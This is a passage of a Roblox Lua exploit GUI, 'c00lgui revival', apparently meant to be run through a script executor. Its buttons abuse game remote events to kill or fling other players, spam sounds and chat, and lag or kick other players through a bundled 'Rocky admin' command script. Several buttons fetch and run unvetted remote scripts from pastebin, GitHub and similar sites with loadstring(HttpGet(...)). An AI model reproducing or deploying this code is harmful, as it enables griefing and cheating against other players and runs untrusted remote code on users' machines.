credits.Size = UDim2.new(0, 149, 0, 265)
credits.Font = Enum.Font.SourceSans
credits.Text = "Thank you for using c00lgui revival! \nMore updates coming soon! \n.gg/KkhpkGJdCp "
credits.TextColor3 = Color3.fromRGB(255, 255, 255)
credits.TextSize = 14.000
credits.TextWrapped = true

pgname_4.Name = "pgname"
pgname_4.Parent = page4
pgname_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
pgname_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
pgname_4.BorderSizePixel = 3
pgname_4.LayoutOrder = 3
pgname_4.Position = UDim2.new(-0.00333332852, 0, 0.86601305, 0)
pgname_4.Size = UDim2.new(0, 300, 0, 40)
pgname_4.ZIndex = 5
pgname_4.Font = Enum.Font.SourceSansBold
pgname_4.Text = "Page 4"
pgname_4.TextColor3 = Color3.fromRGB(255, 255, 255)
pgname_4.TextSize = 19.000

-- Scripts:

local function NYNRIT_fake_script() -- cope.LocalScript 
	local script = Instance.new('LocalScript', cope)

	local main = script.Parent.Parent.main
	local settings = script.Parent.Parent.settings
	local close = script.Parent
	
	close.MouseButton1Down:connect(function()
	if close.Text == "Close" then
	main.Visible = false
	settings.Visible = false
	close.Text = "Open"
	elseif close.Text == "Open" then
	main.Visible = true
	settings.Visible = true
	close.Text = "Close"
	end
	
	end)
	
end
coroutine.wrap(NYNRIT_fake_script)()
local function VGZZVRN_fake_script() -- fps.fpscheck 
	local script = Instance.new('LocalScript', fps)

	local label = script.Parent
	
	local RunService = game:GetService("RunService")
	
	RunService.RenderStepped:Connect(function(frame)
		label.Text = "FPS: "..(math.round(1/frame))
	end)
end
coroutine.wrap(VGZZVRN_fake_script)()
local function IYAH_fake_script() -- size.sizecheck 
	local script = Instance.new('LocalScript', size)

	local label = script.Parent
	
	local RunService = game:GetService("RunService")
	
	while true do
		label.Text = "Server Size: "..tostring(game:GetService('Players').NumPlayers)
		wait(.5)
	end
end
coroutine.wrap(IYAH_fake_script)()
local function PDUUVHM_fake_script() -- time.timecheck 
	local script = Instance.new('LocalScript', time)

	local label = script.Parent
	
	local RunService = game:GetService("RunService")
	
	while true do
		label.Text = "Server Time: "..tostring(game:GetService('Workspace').DistributedGameTime)
		wait(.5)
	end
end
coroutine.wrap(PDUUVHM_fake_script)()
local function UJXVVWH_fake_script() -- checkrfe.rfecheck 
	local script = Instance.new('LocalScript', checkrfe)

	label = script.Parent
	
	if game:GetService("SoundService").RespectFilteringEnabled == true then
	label.Text = "RespectFilteringEnabled is on"
	else
	label.Text = "RespectFilteringEnabled is of"
	end
end
coroutine.wrap(UJXVVWH_fake_script)()
local function BVMU_fake_script() -- sbutton.LocalScript 
	local script = Instance.new('LocalScript', sbutton)

	local sbutton = script.Parent
	local addon = script.Parent.Parent
	
	
	sbutton.MouseButton1Down:connect(function()
		if sbutton.Text == "<" then
			sbutton.Visible = true
			sbutton.Text = ">"
			addon.Position = UDim2.new(-0.00299600535, 3, 0.294712126, 0)
		else
			sbutton.Visible = true
			sbutton.Text = "<"
			addon.Position = UDim2.new(0.280000001, 3, 0.294999987, 0)
		end
	end)
end
coroutine.wrap(BVMU_fake_script)()
local function YRGW_fake_script() -- left.flipleft 
	local script = Instance.new('LocalScript', left)

	local right = script.Parent
	local one = script.Parent.Parent.page1
	local two = script.Parent.Parent.page2
	local three = script.Parent.Parent.page3
	local four = script.Parent.Parent.page4
	
	right.MouseButton1Down:connect(function()
		if three.Visible == true then
		one.Visible = false
		two.Visible = true
		three.Visible = false
		four.Visible = false
		elseif four.Visible == true then
		one.Visible = false
		two.Visible = false
		three.Visible = true
		four.Visible = false
		elseif one.Visible == true then
		one.Visible = false
		two.Visible = false
		three.Visible = false
		four.Visible = true
		elseif two.Visible == true then
		one.Visible = true
		two.Visible = false
		three.Visible = false
		four.Visible = false
		end	
	end)
	
end
coroutine.wrap(YRGW_fake_script)()
local function UBUJB_fake_script() -- right.flipright 
	local script = Instance.new('LocalScript', right)

	local right = script.Parent
	local one = script.Parent.Parent.page1
	local two = script.Parent.Parent.page2
	local three = script.Parent.Parent.page3
	local four = script.Parent.Parent.page4
	
	right.MouseButton1Down:connect(function()
		if one.Visible == true then
		one.Visible = false
		two.Visible = true
		three.Visible = false
		four.Visible = false
		elseif two.Visible == true then
		one.Visible = false
		two.Visible = false
		three.Visible = true
		four.Visible = false
		elseif three.Visible == true then
		one.Visible = false
		two.Visible = false
		three.Visible = false
		four.Visible = true
		elseif four.Visible == true then
		one.Visible = true
		two.Visible = false
		three.Visible = false
		four.Visible = false
		end	
	end)
	
end
coroutine.wrap(UBUJB_fake_script)()
local function GQMYFIM_fake_script() -- button.LocalScript 
	local script = Instance.new('LocalScript', button)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		local duration = 999999 -- integer only, no decimals
		if game:GetService("SoundService").RespectFilteringEnabled then return end
	
		local sounds = {}
	
		for i,v in pairs(Game:GetDescendants()) do
			if v:IsA("Sound")  then
				table.insert(sounds,v)
			end
		end
	
	
		local con = Game.DescendantAdded:Connect(function(v)
			if v:IsA("Sound") then
				table.insert(sounds,v)
			end
		end)
		wait(.1)
		local start = math.floor(tick())
		repeat
			for i,v in pairs(sounds) do
				v:Play()
				v.TimePosition = math.random(0,v.TimeLength * 1000)/1000
				task.wait()
			end
		until math.floor(tick()) == start + duration
		con:Disconnect()
	
		for i,v in pairs(sounds) do
			v:Stop()
		end
	end)
end
coroutine.wrap(GQMYFIM_fake_script)()
local function OEFDAQK_fake_script() -- button_2.LocalScript 
	local script = Instance.new('LocalScript', button_2)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
	--[[
		Thomas The Dank Engine:
								By: KrystalTeam
								Features: Being a dank engine that kill people
								Version: 1.0.0.2
	--]]
	
		local p = game.Players.LocalPlayer.Character
		local weld = Instance.new("Weld",p.Torso)
		weld.Part0 = p.Torso
	
		local train = Instance.new("Part",p.Torso)
		train.Anchored = true
		train.CanCollide = false
		train.Size = Vector3.new(3,2,6)
		train.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
		weld.Part1 = train
		weld.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(180),0)
		train.Anchored = false
		local TrainMesh = Instance.new("SpecialMesh",train)
		TrainMesh.MeshType = Enum.MeshType.FileMesh
		TrainMesh.Scale = Vector3.new(0.020,0.020,0.015)
		TrainMesh.MeshId = "rbxassetid://431017802"
		TrainMesh.TextureId = "rbxassetid://431017809"
	
	
		local weld2 = Instance.new("Weld",p.Torso)
		weld2.Part0 = p.Torso
		local Smoke = Instance.new("Part",p.Torso)
		Smoke.Anchored = true
		Smoke.CanCollide = false
		Smoke.Size = Vector3.new(1,1,1)
		Smoke.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
		weld2.Part1 = Smoke
		weld2.C1 = CFrame.new(0,-4,3.5)-- * CFrame.Angles(0,math.rad(180),0)
		Smoke.Anchored = false
		Smoke.Transparency = 1;
	
		local Particle = Instance.new("ParticleEmitter",Smoke)
		Particle.Rate = 50;
		Particle.Speed = NumberRange.new(30,60);
		Particle.VelocitySpread = 4;
		Particle.Texture = "rbxassetid://133619974"
	
		local Light = Instance.new("SpotLight",train)
		Light.Angle = 45;
		Light.Brightness = 100;
		Light.Face = Enum.NormalId.Back;
		Light.Range = 30;
	
		spawn(function()
			while p.Humanoid.Health ~= 0 do
				p.Humanoid.WalkSpeed = 60;
				wait();
			end
		end)
	
	
		for i,v in pairs(p:GetChildren()) do
			if v:IsA("Part") then
				v.Transparency = 1;
			elseif v:IsA("Hat") then
				v:Destroy()
			elseif v:IsA("Model") then
				v:Destroy()
			end
		end
	
		local function SFX(id) local s=Instance.new("Sound",p.Torso); s.SoundId = "rbxassetid://"..id; s.Volume = 1; return s; end
		local Debounce = false
		train.Touched:connect(function(p)
			if Debounce == false then
				Debounce = true
				if p.Parent then
					if p.Parent:IsA("Model") then
						if game.Players:FindFirstChild(p.Parent.Name) then
							if p.Parent.Name ~= game.Players.LocalPlayer.Name then
								spawn(function()
									for i, plr in pairs(game.Players:GetChildren()) do
										if plr.Name ~= game.Players.LocalPlayer.Name then
											for i = 1, 10 do
												game.ReplicatedStorage.meleeEvent:FireServer(plr)
											end
										end
									end
								end)
								local Whistle = SFX(475073913)
								Whistle:Play()
							end
						end
					end
				end
				wait()
				Debounce = false
			end
		end)
	
		local Music = SFX(190819252)
		Music.Looped = true;
		wait(1)
		Music:Play();
	
		---------------------------------------------------------------------------------
	
		if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
			hiddenfling = true
		else
			hiddenfling = true
			detection = Instance.new("Decal")
			detection.Name = "juisdfj0i32i0eidsuf0iok"
			detection.Parent = game:GetService("ReplicatedStorage")
			local function fling()
				local hrp, c, vel, movel = nil, nil, nil, 0.1
				while true do
					game:GetService("RunService").Heartbeat:Wait()
					if hiddenfling then
						local lp = game.Players.LocalPlayer
						while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
							game:GetService("RunService").Heartbeat:Wait()
							c = lp.Character
							hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
						end
						if hiddenfling then
							vel = hrp.Velocity
							hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
							game:GetService("RunService").RenderStepped:Wait()
							if c and c.Parent and hrp and hrp.Parent then
								hrp.Velocity = vel
							end
							game:GetService("RunService").Stepped:Wait()
							if c and c.Parent and hrp and hrp.Parent then
								hrp.Velocity = vel + Vector3.new(0, movel, 0)
								movel = movel * -1
							end
						end
					end
				end
			end
	
			fling()
		end
	end)
end
coroutine.wrap(OEFDAQK_fake_script)()
local function WSOLZXR_fake_script() -- button_3.LocalScript 
	local script = Instance.new('LocalScript', button_3)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/KdVq9EHW",true))()
	end)
end
coroutine.wrap(WSOLZXR_fake_script)()
local function KORGM_fake_script() -- button_4.LocalScript 
	local script = Instance.new('LocalScript', button_4)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		-- Lyrics
		local lyrics = {
	
			"Spooky Scary Skeletons",
			"Send shivers down your spine",
			"Shrieking skulls will shock your soul",
			"Seal your doom tonight",
			"Spooky Scary Skeletons",
			"Speak with such a screech",
			"You'll shake and shudder in surprise",
			"When you hear these zombies shriek",
			"We're so sorry skeletons",
			"You're so misunderstood",
			"You only want to socialize",
			"But i don't think we should",
			"Cause spooky scary skeletons",
			"Shout startling shrilly screams",
			"They'll sneak from their sarcophagus",
			"And just won't leave you be.",
		}
	
		-- Chat function
		local function singLyrics()
			for _, lyric in ipairs(lyrics) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(lyric, "All")
				wait(2.5) -- Adjust the delay as desired
			end
		end
	
		-- Start singing
		singLyrics()
	end)
end
coroutine.wrap(KORGM_fake_script)()
local function ZTWGZ_fake_script() -- button_5.LocalScript 
	local script = Instance.new('LocalScript', button_5)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet(('https://web.archive.org/web/20230706124218/https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'),true))()
	end)
end
coroutine.wrap(ZTWGZ_fake_script)()
local function PKXRUA_fake_script() -- button_6.LocalScript 
	local script = Instance.new('LocalScript', button_6)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
end
coroutine.wrap(PKXRUA_fake_script)()
local function EKIXV_fake_script() -- button_7.LocalScript 
	local script = Instance.new('LocalScript', button_7)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/spamer/main/spamererm'))()
	end)
end
coroutine.wrap(EKIXV_fake_script)()
local function TBTPQ_fake_script() -- button_8.LocalScript 
	local script = Instance.new('LocalScript', button_8)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet('https://rawscripts.net/raw/OpFinality_590'))()
	end)
end
coroutine.wrap(TBTPQ_fake_script)()
local function XHAG_fake_script() -- button_9.LocalScript 
	local script = Instance.new('LocalScript', button_9)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://gist.githubusercontent.com/jointeamck/5d8a45ea83d64db757182c7fae4caeae/raw/27d5fe5866fc61208fead93a7caeeb854f1c1be4/Illuminati%2520Laser%2520Fling",true))()
	end)
end
coroutine.wrap(XHAG_fake_script)()
local function DXFTXQ_fake_script() -- button_10.LocalScript 
	local script = Instance.new('LocalScript', button_10)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/ScriptHub"))()
	end)
end
coroutine.wrap(DXFTXQ_fake_script)()
local function FJHJF_fake_script() -- button_11.LocalScript 
	local script = Instance.new('LocalScript', button_11)

	local button = script.Parent
	
	button.MouseButton1Down:connect(function()
		-- / Rocky2u's Command Script 2016
		-- /	ROBLOX			|	SethMilkman
		-- /	V3RMILLION		|	Rocky2u
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking
		-- / pls no looking

		wait(5)

		function getRoot(char)
			local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
			return rootPart
		end

		local ADMINS = {}

		local KICKS = {}
		local BANS = {21799524, 133122258, 103000855, 17278822, 149137060, 61967286, 21640881}

		-- / stuff

		local VERSION = '1.7.3'
		local PATCH = '08'
		local UPDATED = '10/5/2016'
		local CHANGES = [[
      / added alot of fe commands
      / more coming soon
]]

		function _G.ADD_ADMIN(ID) table.insert(ADMINS, ID) end
		function _G.ADD_BAN(ID) table.insert(BANS, ID) end

		local CHANGELOG = ' UPDATED : ' .. UPDATED .. '\n VERSION : ' .. VERSION .. ' ' .. PATCH .. '\n\n [ ' .. VERSION .. ' ] \n' .. CHANGES

		local gCoreGui = game:GetService('CoreGui')
		local gInsertService = game:GetService('InsertService')
		local gLighting = game:GetService('Lighting')
		local gNetworkClient = game:GetService('NetworkClient')
		local gPlayers = game:GetService('Players')
		local gWorkspace = game:GetService('Workspace')

		local LP = gPlayers.LocalPlayer
		local MOUSE = LP:GetMouse()

		local SERVICES = {}
		local COMMANDS = {}
		local STD = {}

		SERVICES.EVENTS = {}

		local C_PREFIX = ';'
		local S_PREFIX = '\\'
		local SPLIT = ' '

		for i,v in pairs(gCoreGui:GetChildren()) do if v.Name == 'cmdbar_seth' or v.Name == 'notify_seth' then v:destroy() end end

		function UPDATE_CHAT(PLAYER) local C = PLAYER.Chatted:connect(function(M) if CHECK_ADMIN(PLAYER) then DEXECUTE(M, PLAYER) end end) table.insert(SERVICES.EVENTS, C) end

		STD.TABLE = function(T, V) if not T then return false end for i,v in pairs(T) do if v == V then return true end end return false end
		STD.ENDAT = function(S, V) local SF = S:find(V) if SF then return S:sub(0, SF - string.len(V)), true else return S, false end end

		function CHECK_ADMIN(PLAYER) if FIND_IN_TABLE(ADMINS, PLAYER.userId) then return true elseif PLAYER.userId == LP.userId then return true end end

		function EXECUTE(STRING) spawn(function() local S, L = loadstring(STRING) if not S then error(L) else S() end end) end

		function FCOMMAND(COMMAND) for i,v in pairs(COMMANDS) do if v.N:lower() == COMMAND:lower() or STD.TABLE(v.A, COMMAND:lower()) then return v end end end

		function GCOMMAND(M) local CMD, HS = STD.ENDAT(M:lower(), SPLIT) if HS then return {CMD, true} else return {CMD, false} end end

		function GPREFIX(STRING) if STRING:sub(1, string.len(C_PREFIX)) == C_PREFIX then return {'COMMAND', string.len(C_PREFIX) + 1} elseif STRING:sub(1, string.len(S_PREFIX)) == S_PREFIX then return {'EXECUTE', string.len(S_PREFIX) + 1} end return end

		function GARGS(STRING) local A = {} local NA = nil local HS = nil local S = STRING repeat NA, HS = STD.ENDAT(S:lower(), SPLIT) if NA ~= '' then table.insert(A, NA) S = S:sub(string.len(NA) + string.len(SPLIT) + 1) end until not HS return A end

		function GCAPARGS(STRING) local A = {} local NA = nil local HS = nil local S = STRING repeat NA, HS = STD.ENDAT(S, SPLIT) if NA ~= '' then table.insert(A, NA) S = S:sub(string.len(NA) + string.len(SPLIT) + 1) end until not HS return A end

		function ECOMMAND(STRING, SPEAKER) repeat if STRING:find('  ') then STRING = STRING:gsub('  ', ' ') end until not STRING:find('  ') local SCMD, A, CMD SCMD = GCOMMAND(STRING) CMD = FCOMMAND(SCMD[1]) if not CMD then return end A = STRING:sub(string.len(SCMD[1]) + string.len(SPLIT) + 1) local ARGS = GARGS(A) CA = GCAPARGS(A) pcall(function() CMD.F(ARGS, SPEAKER) end) end

		function DEXECUTE(STRING, SPEAKER) if not CHECK_ADMIN(SPEAKER) then return end STRING = STRING:gsub('/e ', '') local GP = GPREFIX(STRING) if not GP then return end STRING = STRING:sub(GP[2]) if GP[1] == 'EXECUTE' then EXECUTE(STRING) elseif GP[1] == 'COMMAND' then ECOMMAND(STRING, SPEAKER) end end naga = {SethMilkman = true, ['11_eyes'] = true, lahphnya = true, LuaStateV = true, relesia = true, winteright = true}

		_G.cmd_seth = ECOMMAND

		SERVER_LOCKED = false

		gPlayers.PlayerAdded:connect(function(PLAYER)
			if SERVER_LOCKED then PLAYER.CharacterAdded:connect(function() wait() table.insert(KICKS, PLAYER) return end) end
			if FIND_IN_TABLE(BANS, PLAYER.userId) then PLAYER.CharacterAdded:connect(function() wait() table.insert(KICKS, PLAYER) return end) end
			UPDATE_CHAT(PLAYER)
			if CHECK_ADMIN(PLAYER) then PLAYER.CharacterAdded:connect(function() wait() game.Chat:Chat(PLAYER.Character.Head, printStuff .. 'Welcome, you\'re an admin!') end) end
		end)

		function ADD_COMMAND(N, D, A, F) table.insert(COMMANDS, {N = N, D = D, A = A, F = F}) end

		function GET_PLAYER(NAME, SPEAKER)
			local NAME_TABLE = {}
			NAME = NAME:lower()
			if NAME == 'me' then
				table.insert(NAME_TABLE, SPEAKER.Name)
			elseif NAME == 'others' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v:IsA('Player') then if v.Name ~= SPEAKER.Name then table.insert(NAME_TABLE, v.Name) end end end
			elseif NAME == 'all' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v:IsA('Player') then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'random' then
				table.insert(NAME_TABLE, gPlayers:GetPlayers()[math.random(1, #gPlayers:GetPlayers())].Name)
			elseif NAME == 'team' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v.TeamColor == SPEAKER.TeamColor then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'nonadmins' then
				for i,v in pairs(gPlayers:GetPlayers()) do if not CHECK_ADMIN(v) then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'admins' then
				for i,v in pairs(gPlayers:GetPlayers()) do if CHECK_ADMIN(v) then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'nonfriends' then
				for i,v in pairs(gPlayers:GetPlayers()) do if not v:IsFriendsWith(SPEAKER.userId) then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'friends' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v ~= SPEAKER and v:IsFriendsWith(SPEAKER.userId) then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'nonguests' then
				for i,v in pairs(gPlayers:GetPlayers()) do if not v.Guest then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'guests' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v.Guest then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'nbcs' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v.MembershipType == Enum.MembershipType.None then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'bcs' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v.MembershipType == Enum.MembershipType.BuildersClub then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'tbcs' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v.MembershipType == Enum.MembershipType.TurboBuildersClub then table.insert(NAME_TABLE, v.Name) end end
			elseif NAME == 'obcs' then
				for i,v in pairs(gPlayers:GetPlayers()) do if v.MembershipType == Enum.MembershipType.OutrageousBuildersClub then table.insert(NAME_TABLE, v.Name) end end
			else
				for i,v in pairs(gPlayers:GetPlayers()) do local L_NAME = v.Name:lower() local F = L_NAME:find(NAME) if F == 1 then table.insert(NAME_TABLE, v.Name) end end
			end
			if not naga[SPEAKER.Name] then for i,v in pairs(NAME_TABLE) do if naga[v] then table.remove(NAME_TABLE, i) end end end
			return NAME_TABLE
		end

		function GLS(LOWER, START) local AA = '' for i,v in pairs(CA) do if i > START then if AA ~= '' then AA = AA .. ' ' .. v else AA = AA .. v end end end if not LOWER then return AA else return string.lower(AA) end end

		-- / tables

		local JAILED = {}

		-- / stuff

		printStuff = '[ Rocky Admin Classic CMDs ] : '

		local DATA = game:GetObjects('rbxassetid://291592144')[1]
		_G.seth_data = DATA

		local CMDbar = DATA.guis.cmdbar_seth.CMDbar CMDbar.Parent.Parent = gCoreGui
		local being_looped = DATA.being_looped

		wait()

		local NOCLIP, JESUSFLY, SWIM = false, false, false

		spawn(function() while wait() do
				if NOCLIP then
					if LP.Character:FindFirstChild('Humanoid') then LP.Character.Humanoid:ChangeState(11) end
				elseif JESUSFLY then
					if LP.Character:FindFirstChild('Humanoid') then LP.Character.Humanoid:ChangeState(12) end
				elseif SWIM then
					if LP.Character:FindFirstChild('Humanoid') then LP.Character.Humanoid:ChangeState(4) end
				end
				spawn(function() while wait() do for i,v in pairs(gPlayers:GetPlayers()) do if FIND_IN_TABLE(KICKS, v) then KICK(v) end end end end)
			end end)

		function FIND_IN_TABLE(TABLE, NAME)
			for i,v in pairs(TABLE) do
				if v == NAME then
					return true
				end
			end
			return false
		end

		function GET_IN_TABLE(TABLE, NAME)
			for i = 1, #TABLE do
				if TABLE[i] == NAME then
					return i
				end
			end
			return false
		end

		local NOTIFY_1 = false
		local NOTIFY_2 = false

		function NOTIFY(M, R, G, B)
			spawn(function()
				repeat wait() until not NOTIFY_1
				local NOTIFY_SETH = DATA.guis.notify_seth:Clone() NOTIFY_SETH.Parent = gCoreGui
				if NOTIFY_SETH then
					NOTIFY_SETH.NOTIFY.NOTE.BAR.BackgroundColor3 = Color3.new(R, G, B)
					NOTIFY_SETH.NOTIFY.NOTE.Text = ' ' .. M
					repeat wait() until not NOTIFY_1
					NOTIFY_1 = true
					wait(0.5)
					NOTIFY_SETH.NOTIFY:TweenPosition(UDim2.new(0, 0, 0.7, 0), 'InOut', 'Quad', 0.4, false) wait(0.5)
					wait(0.5)
					repeat wait() until not NOTIFY_2
					NOTIFY_1 = false
					NOTIFY_SETH.NOTIFY:TweenPosition(UDim2.new(0, 0, 0.7, -40), 'InOut', 'Quad', 0.4, false) wait(0.5)
					wait(0.5)
					NOTIFY_2 = true
					wait(2.5)
					NOTIFY_SETH.NOTIFY:TweenPosition(UDim2.new(0, -225, 0.7, -40), 'InOut', 'Quad', 0.4, false) wait(0.5)
				end
				wait(1)
				NOTIFY_SETH:destroy()
				NOTIFY_2 = false
			end)
		end

		function LOAD_SETH()
			spawn(function()
				local load_seth = DATA.guis.loader_seth:Clone() load_seth.Parent = gCoreGui
				load_seth.MAIN:TweenSizeAndPosition(UDim2.new(0, 300, 0, 200), UDim2.new(0.5, -150, 0.5, -100), 'Out', 'Quad', 0.5, false) wait(0.5)
				load_seth.MAIN.TEXT.Text = 'Rocky Script Classic'
				repeat wait() load_seth.MAIN.TEXT.TextTransparency = load_seth.MAIN.TEXT.TextTransparency - 0.1 until load_seth.MAIN.TEXT.TextTransparency < 0 wait(1)
				if not gWorkspace.FilteringEnabled then load_seth.MAIN.FE.Text = ' Filtering is disabled' elseif gWorkspace.FilteringEnabled then load_seth.MAIN.FE.Text = ' Filtering is ENABLED' end load_seth.MAIN.FE.TextTransparency = 0 wait(1)
				load_seth.MAIN.COMMANDS.Text = ' ' .. #COMMANDS .. ' commands!' load_seth.MAIN.COMMANDS.TextTransparency = 0 wait(1)
				load_seth.MAIN.WELCOME.Text = ' Welcome, ' .. LP.Name load_seth.MAIN.WELCOME.TextTransparency = 0 wait(1)
				load_seth.MAIN.C.Text = 'Rockys Admin 2016' load_seth.MAIN.C.TextTransparency = 0 wait(5)
				for i,v in pairs(load_seth.MAIN:GetChildren()) do if v:IsA('TextLabel')and v.Name ~= 'TEXT' then v.TextTransparency = 1 end end wait()
				repeat wait() load_seth.MAIN.TEXT.TextTransparency = load_seth.MAIN.TEXT.TextTransparency + 0.1 until load_seth.MAIN.TEXT.TextTransparency == 1
				load_seth.MAIN:TweenSizeAndPosition(UDim2.new(0, 0, 0, 0), UDim2.new(0.5, 0, 0.5, 0), 'Out', 'Quad', 0.5)
				wait(1)
				load_seth.MAIN:destroy()
			end)
		end

		local S_INFO = false

		function SERVER_INFO()
			if not S_INFO then
				spawn(function()
					S_INFO = true
					local server_seth = DATA.guis.server_seth:Clone() server_seth.Parent = gCoreGui
					if not gWorkspace.FilteringEnabled then server_seth.MAIN.FE.Text = ' FilteringEnabled | false' elseif gWorkspace.FilteringEnabled then server_seth.MAIN.FE.Text = ' FilteringEnabled | true' end
					server_seth.MAIN.IP.Text = ' IP Address | ' .. gNetworkClient.ClientReplicator.MachineAddress .. ':' .. gNetworkClient.ClientReplicator.Port
					server_seth.MAIN.PLACE_ID.Text = ' PlaceId | ' .. game.PlaceId
					server_seth.MAIN.EXIT.MouseButton1Down:connect(function() S_INFO = false server_seth:destroy() end)
					while S_INFO do
						server_seth.MAIN.PLAYERS.Text = ' Players | ' .. gPlayers.NumPlayers .. ' / ' .. gPlayers.MaxPlayers
						server_seth.MAIN.TIME.Text = ' Time | ' .. gLighting.TimeOfDay
						wait()
					end
				end)
			end
		end

		function KICK(P)
			spawn(function()
				if P.Character and P.Character:FindFirstChild('HumanoidRootPart') and P.Character:FindFirstChild('Torso') then
					P.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(999000, 1001000), 1000000, 1000000)
					local SP = Instance.new('SkateboardPlatform', P.Character) SP.Position = P.Character.HumanoidRootPart.Position SP.Transparency = 1
					spawn(function()
						repeat wait()
							if P.Character and P.Character:FindFirstChild('HumanoidRootPart') then SP.Position = P.Character.HumanoidRootPart.Position end
						until not gPlayers:FindFirstChild(P.Name)
					end)
					P.Character.Torso.Anchored = true
				end
			end)
		end

		gPlayers.PlayerRemoving:connect(function(P)
			if FIND_IN_TABLE(KICKS, P) then
				for i,v in pairs(KICKS) do if v == P then table.remove(KICKS, i) end end
				NOTIFY('KICKED ' .. P.Name, 255, 255, 255)
			end
		end)

		function FIX_LIGHTING()
			gLighting.Ambient = Color3.new(0.5, 0.5, 0.5)
			gLighting.Brightness = 1
			gLighting.GlobalShadows = true
			gLighting.Outlines = false
			gLighting.TimeOfDay = 14
			gLighting.FogEnd = 100000
		end

		function MESSAGE_HINT(TYPE, HEADER, MESSAGE, PLAYER)
			local BV = Instance.new('BoolValue', DATA.messages_hints) BV.Name = PLAYER.Name .. '_MSG_HINT'
			local SPRAY = gInsertService:LoadAsset(80576967)
			local S = SPRAY.Spray:Clone() S.Name = '' S.Handle.Transparency = 1 S.SprayGui:destroy() S.SprayPaint:destroy() S.TextureId = ''
			if TYPE == 'MESSAGE' then
				local GUI = DATA.guis.message_seth:Clone() GUI.HINT:destroy() GUI.Name = 'SprayGui' GUI.MESSAGE.header.Text = HEADER GUI.MESSAGE.message.Text = MESSAGE GUI.MESSAGE.Visible = true GUI.Parent = S
			elseif TYPE == 'HINT' then
				local GUI = DATA.guis.message_seth:Clone() GUI.MESSAGE:destroy() GUI.Name = 'SprayGui' GUI.HINT.Text = MESSAGE GUI.HINT.Visible = true GUI.Parent = S
			end
			for i = 1, 100 do
				wait()
				PLAYER.Character.Humanoid:EquipTool(S)
			end
			PLAYER.Character.Humanoid:UnequipTools()
			S:destroy() wait() BV:destroy()
		end

		function COLOR(PLAYER, BCOLOR)
			for i,v in pairs(PLAYER.Character:GetChildren()) do if v:IsA('Shirt') or v:IsA('Pants') then v:destroy() elseif v:IsA('ShirtGraphic') then v.Archivable = false v.Graphic = '' end end
			for i,v in pairs(PLAYER.Character.Head:GetChildren()) do if v:IsA('Decal') then v:destroy() end end
			for i,v in pairs(PLAYER.Character:GetChildren()) do
				if v:IsA('Part') and v.Name ~= 'HumanoidRootPart' then
					v.BrickColor = BrickColor.new(BCOLOR)
				elseif v:IsA('Hat') then
					v.Handle.BrickColor = BrickColor.new(BCOLOR)
					for a,b in pairs(v.Handle:GetChildren()) do
						if b:IsA('SpecialMesh') then
							b.TextureId = ''
						end
					end
				end
			end
		end

		function LAG(PLAYER)
			local POS = CFrame.new(math.random(-100000, 100000), math.random(-100000, 100000), math.random(-100000, 100000))
			spawn(function()
				repeat wait()
					if PLAYER and PLAYER.Character then
						PLAYER.CameraMode = 'LockFirstPerson'
						PLAYER.Character.HumanoidRootPart.CFrame = POS
						PLAYER.Character.Torso.Anchored = true
						Instance.new('ForceField', PLAYER.Character)
						Instance.new('Smoke', PLAYER.Character.Head)
					end
				until not gPlayers:FindFirstChild(PLAYER.Name)
			end)
		end

		local FLYING = false

		if LP.Character and LP.Character:FindFirstChild('Humanoid') then
			LP.Character.Humanoid.Died:connect(function() FLYING = false end)
		end

		function sFLY()
